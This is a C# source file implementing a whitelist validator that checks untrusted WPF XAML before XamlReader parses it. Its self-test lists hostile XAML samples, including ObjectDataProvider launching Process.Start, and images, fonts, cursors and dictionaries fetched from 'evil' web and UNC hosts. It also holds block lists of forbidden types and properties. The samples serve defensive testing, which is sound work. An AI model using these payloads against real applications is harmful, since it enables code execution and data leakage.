using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Data;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Media.Effects;
using System.Xml.Linq;
using XamlA11y.Core.Analysis;
using XamlMarkup = XamlA11y.Core.Xaml.Markup;

namespace UiaOracle;

/// <summary>
/// 別人的 XAML 交給 XamlReader 之前的最後一關。XamlReader 會建立 XAML 指名的任何型別、呼叫方法（ObjectDataProvider）、
/// 打開 Uri 與 UNC 路徑，所以這裡是**白名單**：只有列出的型別、標記延伸與值的形狀可以過，其他一律丟例外。
///
/// WindowCheck 的清理負責「讓它載得進來」，可以有漏；這一關不看它做了什麼，自己從頭檢查要解析的那份文件。
/// 惡意樣本在 <see cref="SelfTest"/>（uiaoracle check-hostile）。
/// </summary>
internal static partial class SafeMarkup
{
    private static readonly XNamespace Wpf = XamlMarkup.WpfNamespace;
    private static readonly XNamespace X = XamlMarkup.XamlNamespace;
    private static readonly XNamespace Sys = "clr-namespace:System;assembly=System.Runtime";

    /// <summary>可以建立的型別：這些與它們的子類別（再扣掉 <see cref="Forbidden"/>）。</summary>
    private static readonly Type[] Families =
    [
        typeof(Panel), typeof(Control), typeof(Decorator), typeof(TextBlock), typeof(AccessText), typeof(Image), typeof(System.Windows.Shapes.Shape),
        typeof(Page), typeof(ContentPresenter), typeof(ItemsPresenter), typeof(GridViewRowPresenterBase), typeof(Track), typeof(TickBar),
        typeof(System.Windows.Documents.Inline), typeof(System.Windows.Documents.Block), typeof(System.Windows.Documents.FlowDocument),
        typeof(FrameworkTemplate), typeof(Style), typeof(Setter), typeof(Trigger), typeof(DataTrigger), typeof(MultiTrigger), typeof(Condition), typeof(ResourceDictionary),
        typeof(SolidColorBrush), typeof(GradientBrush), typeof(GradientStop), typeof(Transform), typeof(Geometry), typeof(PathFigure), typeof(PathSegment),
        typeof(DropShadowEffect), typeof(BlurEffect), typeof(RowDefinition), typeof(ColumnDefinition), typeof(GridView), typeof(GridViewColumn), typeof(DataGridColumn),
        typeof(RoutedCommand), typeof(BooleanToVisibilityConverter), typeof(GroupStyle),
        typeof(TransformCollection), typeof(GradientStopCollection), typeof(PathFigureCollection), typeof(PathSegmentCollection), typeof(GeometryCollection), typeof(DoubleCollection), typeof(PointCollection),
    ];

    private static readonly HashSet<string> Forbidden = new(StringComparer.Ordinal)
    {
        "Frame", "NavigationWindow", "DocumentViewer", "FlowDocumentReader", "FlowDocumentPageViewer", "StickyNoteControl", "FixedPage", "Page`1", "InkCanvas", "WebBrowser",
    };

    /// <summary>型別本身就會讀檔或上網的屬性，用哪種寫法設都不行。</summary>
    private static readonly HashSet<string> ForbiddenProperties = new(StringComparer.Ordinal)
    {
        "Source", "UriSource", "ImageSource", "NavigateUri", "FontUri", "BaseUri", "BitmapEffect", "Cursor", "ForceCursor", "Icon", "StartupUri", "SmallImageSource", "LargeImageSource",
        "DataContext", "ItemsSource", "Document", "CommandParameter", "CommandTarget", "ObjectType", "MethodName", "ObjectInstance", "Handler", "Event", "RoutedEvent", "Language", "InputScope",
    };

    private static readonly HashSet<string> AllowedExtensions = new(StringComparer.Ordinal)
    { "Binding", "TemplateBinding", "StaticResource", "DynamicResource", "x:Null", "x:Type", "x:Static", "RelativeSource" };

    /// <summary>這些屬性是給人看的文字：可以有網址，不會被打開。</summary>
    private static readonly HashSet<string> PlainText = new(StringComparer.Ordinal) { "Content", "Header", "Text", "Title", "ToolTip", "Tag", "AutomationProperties.Name", "AutomationProperties.HelpText" };

    /// <summary>函式庫的佈景字典（只有這幾個型別、字面的短值）。</summary>
    private static readonly HashSet<string> ThemeDictionaries = new(StringComparer.Ordinal) { "BundledTheme", "CustomColorTheme", "ThemesDictionary", "ControlsDictionary", "Theme", "StandaloneTheme" };

    public static bool Allows(Type type) =>
        type is { IsAbstract: false, IsGenericType: false } && !Forbidden.Contains(type.Name) && Families.Any(f => f.IsAssignableFrom(type)) && type.Assembly.GetName().Name is "PresentationFramework" or "PresentationCore" or "WindowsBase";

    public static bool AllowsProperty(string property) => !ForbiddenProperties.Contains(property[(property.LastIndexOf('.') + 1)..].Trim(')', ' '));

    /// <summary>檢查過才解析。</summary>
    public static object Parse(XElement root, Func<string, Type?> typeOf)
    {
        Check(root, typeOf);
        return XamlReader.Parse(root.ToString(SaveOptions.DisableFormatting));
    }

    /// <summary>專案合併的函式庫佈景：重新造一個只有字面屬性的元素。不是佈景回 null。</summary>
    public static ResourceDictionary? ParseTheme(XElement written)
    {
        var library = KnownControls.LibraryOf(written) is not null;
        if (library ? !ThemeDictionaries.Contains(written.Name.LocalName) : written.Name != Wpf + "ResourceDictionary") return null;
        var fresh = new XElement(written.Name);
        foreach (var a in written.Attributes())
        {
            if (a.IsNamespaceDeclaration || a.Name.NamespaceName.Length > 0) continue;
            if (a.Name.LocalName == "Source" ? ThemeSource().IsMatch(a.Value) : library && Word().IsMatch(a.Value)) fresh.SetAttributeValue(a.Name, a.Value);
        }
        if (!library && fresh.Attribute("Source") is null) return null;
        return (ResourceDictionary)XamlReader.Parse(fresh.ToString(SaveOptions.DisableFormatting));
    }

    public static bool IsThemeSource(string source) => ThemeSource().IsMatch(source);

    public static void Check(XElement root, Func<string, Type?> typeOf)
    {
        foreach (var e in root.DescendantsAndSelf())
        {
            var local = e.Name.LocalName;
            if (e.Name.Namespace == Sys)
            {
                if (local is not ("String" or "Double" or "Int32" or "Boolean") || e.HasElements) throw No($"<sys:{local}>");
                continue;
            }
            if (e.Name.Namespace != Wpf) throw No($"namespace {e.Name.NamespaceName}");

            var dot = local.IndexOf('.');
            if (dot > 0)
            {
                if (typeOf(local[..dot]) is null) throw No($"<{local}>");
                if (!AllowsProperty(local)) throw No($"<{local}>");
                // 屬性元素裡的文字會被轉成那個屬性的型別：字型、路徑
                if (!PlainText.Contains(local[(dot + 1)..]) && !(local == "Setter.Value" && PlainText.Contains(Last((string?)e.Parent?.Attribute("Property")))))
                    Value(string.Concat(e.Nodes().OfType<XText>().Select(t => t.Value)), local);
            }
            else if (typeOf(local) is not { } type || !Allows(type)) throw No($"<{local}>");

            foreach (var a in e.Attributes())
            {
                if (a.IsNamespaceDeclaration)
                {
                    if (a.Value != Wpf.NamespaceName && a.Value != X.NamespaceName && a.Value != Sys.NamespaceName) throw No($"xmlns {a.Value}");
                    continue;
                }
                if (a.Name.Namespace == X)
                {
                    if (a.Name.LocalName is not ("Key" or "Name")) throw No($"x:{a.Name.LocalName}");
                    if (XamlMarkup.IsMarkup(a.Value)) Extension(a.Value);
                    continue;
                }
                if (a.Name.NamespaceName.Length > 0) throw No($"attribute {a.Name}");
                var name = a.Name.LocalName;
                if (dot > 0) throw No($"{local} {name}");
                if (!AllowsProperty(name)) throw No(name);
                // <Setter Property="Source" Value="\\server\x.png"/>
                if (name == "Property" && ((local == "Setter" && !AllowsProperty(a.Value)) || a.Value.Contains(':', StringComparison.Ordinal) || a.Value.Contains('(', StringComparison.Ordinal))) throw No("Setter " + a.Value);
                var owner = name[(name.LastIndexOf('.') + 1)..];
                if (typeOf(local)!.GetEvent(owner) is not null && name.IndexOf('.') < 0) throw No("event " + name);
                if (name.IndexOf('.') is > 0 and var d && (typeOf(name[..d]) is not { } at || at.GetEvent(owner) is not null)) throw No("event " + name);
                if (XamlMarkup.IsMarkup(a.Value)) { Extension(a.Value); continue; }
                if (PlainText.Contains(name) || (name == "Value" && PlainText.Contains(Last((string?)e.Attribute("Property"))))) continue;
                Value(a.Value, name);
            }
        }
        return;

        static string Last(string? property) => property is null ? "" : PlainText.Contains(property) ? property : property[(property.LastIndexOf('.') + 1)..];

        // 看起來像路徑、網址、UNC 的值都不行（FontFamily="\\server\share\#x"、file:///…、pack://…、/x;component/…）
        static void Value(string value, string where)
        {
            if (value.Contains("//", StringComparison.Ordinal) || value.Contains('\\', StringComparison.Ordinal) || value.Contains(";component/", StringComparison.OrdinalIgnoreCase)
                || (where.EndsWith("FontFamily", StringComparison.Ordinal) && value.AsSpan().IndexOfAny('/', '#', ':') >= 0)
                || UriScheme().IsMatch(value)) throw No($"{where}=\"{value}\"");
        }
    }

    /// <summary>標記延伸：名字在白名單裡，裡面每一層也是；x:Static 與 x:Type 只認沒有前綴的（WPF 自己的）。</summary>
    private static void Extension(string markup)
    {
        foreach (Match m in ExtensionName().Matches(markup))
            if (!AllowedExtensions.Contains(m.Groups[1].Value)) throw No("{" + m.Groups[1].Value + "}");
        foreach (Match m in PrefixedArgument().Matches(markup)) throw No(m.Value);
        if (markup.Contains("//", StringComparison.Ordinal) || markup.Contains('\\', StringComparison.Ordinal) || markup.Contains("Source=", StringComparison.Ordinal) && !markup.Contains("RelativeSource=", StringComparison.Ordinal)
            || markup.Replace("RelativeSource=", "", StringComparison.Ordinal).Contains("Source=", StringComparison.Ordinal)) throw No(markup);
    }

    private static InvalidOperationException No(string what) => new("refused: " + what);

    [GeneratedRegex(@"\{\s*([\w:]+)")]
    private static partial Regex ExtensionName();

    /// <summary>x:Static p:Type.Member、x:Type p:Type：前綴只准 x 與 sys 以外的都沒有。</summary>
    [GeneratedRegex(@"\{\s*x:(?:Static|Type)\s+(?:Member=|TypeName=|Type=)?\s*[\w]+:")]
    private static partial Regex PrefixedArgument();

    [GeneratedRegex(@"^\s*(?:[A-Za-z][A-Za-z0-9+.\-]{1,20}):(?!\s)(?![0-9])", RegexOptions.CultureInvariant)]
    private static partial Regex UriScheme();

    [GeneratedRegex(@"^(?:pack://application:,,,)?/(MahApps\.Metro|MaterialDesignThemes\.Wpf|MaterialDesignColors|HandyControl|Wpf\.Ui|PresentationFramework\.[A-Za-z0-9]{1,20});component/[A-Za-z0-9_./-]{1,200}\.xaml$", RegexOptions.IgnoreCase)]
    private static partial Regex ThemeSource();

    [GeneratedRegex(@"^#?[A-Za-z0-9]{1,30}$")]
    private static partial Regex Word();

    /// <summary>每一種已知的惡意寫法：直接過最後一關，也過一次 WindowCheck 的清理。一個都不能被解析。</summary>
    public static int SelfTest()
    {
        const string Ns = "xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:d=\"clr-namespace:System.Diagnostics;assembly=System.Diagnostics.Process\" xmlns:io=\"clr-namespace:System.IO;assembly=System.Runtime\" xmlns:s=\"clr-namespace:System;assembly=System.Runtime\"";
        string[] hostile =
        [
            "<Window.Resources><ObjectDataProvider x:Key=\"k\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><s:String>calc</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></Window.Resources>",
            "<Window.Resources><d:ProcessStartInfo x:Key=\"k\" FileName=\"calc\"/></Window.Resources>",
            "<Window.Resources><io:FileInfo x:Key=\"k\"><x:Arguments><s:String>C:/x</s:String></x:Arguments></io:FileInfo></Window.Resources>",
            "<Window.Resources><XmlDataProvider x:Key=\"k\" Source=\"http://evil/x.xml\"/></Window.Resources>",
            "<Window.Resources><ResourceDictionary Source=\"http://evil/x.xaml\"/></Window.Resources>",
            "<Window.Resources><ResourceDictionary Source=\"//evil/share/x.xaml\"/></Window.Resources>",
            "<Window.Resources><ResourceDictionary><ResourceDictionary.MergedDictionaries><ResourceDictionary Source=\"/MahApps.Metro;component/Styles/Controls.xaml\"><ObjectDataProvider x:Key=\"k\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\"/></ResourceDictionary></ResourceDictionary.MergedDictionaries></ResourceDictionary></Window.Resources>",
            "<Frame Source=\"http://evil/\"/>", "<WebBrowser Source=\"http://evil/\"/>", "<MediaElement Source=\"//evil/share/a.mp4\"/>",
            "<Image Source=\"http://evil/a.png\"/>", "<Image><Image.Source>//evil/share/a.png</Image.Source></Image>", "<Image><Image.Source><BitmapImage UriSource=\"http://evil/a.png\"/></Image.Source></Image>",
            "<Button FontFamily=\"//evil/share/#f\" Content=\"x\"/>", "<Button FontFamily=\"file:///c:/x/#f\" Content=\"x\"/>", "<Button Content=\"x\"><Button.FontFamily>http://evil/#f</Button.FontFamily></Button>",
            "<Button Cursor=\"//evil/share/a.cur\" Content=\"x\"/>", "<Button Content=\"x\"><Button.Style><Style TargetType=\"Button\"><Setter Property=\"Cursor\" Value=\"//evil/a.cur\"/></Style></Button.Style></Button>",
            "<Image><Image.Style><Style TargetType=\"Image\"><Setter Property=\"Source\" Value=\"http://evil/a.png\"/></Style></Image.Style></Image>",
            "<Image><Image.Style><Style TargetType=\"Image\"><Setter Property=\"Source\"><Setter.Value>http://evil/a.png</Setter.Value></Setter></Style></Image.Style></Image>",
            "<Button Content=\"x\"><Button.Style><Style TargetType=\"Button\"><Setter Property=\"FontFamily\"><Setter.Value>//evil/#f</Setter.Value></Setter></Style></Button.Style></Button>",
            "<Button Content=\"x\"><Button.Style><Style TargetType=\"Button\"><Setter Property=\"Background\"><Setter.Value><ImageBrush ImageSource=\"http://evil/a.png\"/></Setter.Value></Setter></Style></Button.Style></Button>",
            "<Button Content=\"{Binding Source={x:Static d:Process.Start}}\"/>", "<Button Content=\"{x:Static s:Environment.MachineName}\"/>", "<Button Content=\"{Binding Path=X, Source={StaticResource k}}\"/>",
            "<Button Click=\"Evil\" Content=\"x\"/>", "<Button ButtonBase.Click=\"Evil\" Content=\"x\"/>", "<Button Content=\"x\"><x:Code><![CDATA[ void M() {} ]]></x:Code></Button>",
            "<TextBlock><Hyperlink NavigateUri=\"http://evil/\">x</Hyperlink></TextBlock>", "<DocumentViewer/>",
            "<Button Content=\"x\"><Button.Triggers><EventTrigger RoutedEvent=\"Loaded\"><SoundPlayerAction Source=\"http://evil/a.wav\"/></EventTrigger></Button.Triggers></Button>",
            "<Button Tag=\"{x:Reference k}\" x:FieldModifier=\"public\" Content=\"x\"/>", "<Glyphs FontUri=\"http://evil/f.ttf\" UnicodeString=\"x\" FontRenderingEmSize=\"9\"/>",
        ];

        var bad = 0;
        foreach (var body in hostile)
        {
            var xml = XElement.Parse($"<Window {Ns} x:Class=\"A.B\" Title=\"t\">{(body.StartsWith("<Window.", StringComparison.Ordinal) ? body : $"<StackPanel>{body}</StackPanel>")}</Window>");
            foreach (var a in xml.Attributes().Where(a => a.Name == X + "Class").ToList()) a.Remove();

            // 1. 原樣送最後一關：要被擋
            var refused = false;
            try { Check(XElement.Parse(xml.ToString()), WindowCheck.TypeNamed); } catch (InvalidOperationException) { refused = true; }
            if (!refused) { bad++; Console.WriteLine("  NOT REFUSED " + body); }

            // 2. 走完整條路（清理＋最後一關）：剩下的東西要過得了同一關
            var cleaned = WindowCheck.CleanForTest(xml);
            try { Check(cleaned, WindowCheck.TypeNamed); }
            catch (InvalidOperationException e) { Console.WriteLine($"  (the cleaner let through, the gate stops it) {e.Message}: {body[..Math.Min(90, body.Length)]}"); }
            var text = cleaned.ToString();
            foreach (var token in (string[])["evil", "Process", "ObjectDataProvider", "FileInfo", "MachineName", "x:Code", "Click="])
                if (text.Contains(token, StringComparison.Ordinal)) { bad++; Console.WriteLine($"  LEFT IN '{token}': {body}"); }
        }
        // 佈景那條路：夾帶的內容不能跟著進去
        foreach (var theme in (string[])[
            $"<ResourceDictionary {Ns} Source=\"/HandyControl;component/Themes/SkinDefault.xaml\"><ObjectDataProvider x:Key=\"k\"/></ResourceDictionary>",
            $"<ResourceDictionary {Ns} Source=\"http://evil/HandyControl;component/a.xaml\"/>", $"<ResourceDictionary {Ns} Source=\"//evil/HandyControl;component/a.xaml\"/>",
            "<m:TextBox xmlns:m=\"https://handyorg.github.io/handycontrol\"/>", "<m:BundledTheme xmlns:m=\"http://materialdesigninxaml.net/winfx/xaml/themes\" Source=\"http://evil/a.xaml\"/>"])
        {
            ResourceDictionary? parsed = null;
            try { System.Reflection.Assembly.Load("HandyControl"); parsed = ParseTheme(XElement.Parse(theme)); } catch (Exception e) when (e is XamlParseException or InvalidOperationException) { }
            if (parsed is not null && (parsed.Contains("k") || parsed.Source?.ToString().Contains("evil", StringComparison.Ordinal) == true)) { bad++; Console.WriteLine("  THEME " + theme); }
        }
        Console.WriteLine($"hostile markup: {hostile.Length} samples, {(bad == 0 ? "none gets through" : bad + " GOT THROUGH")}");
        return bad;
    }
}
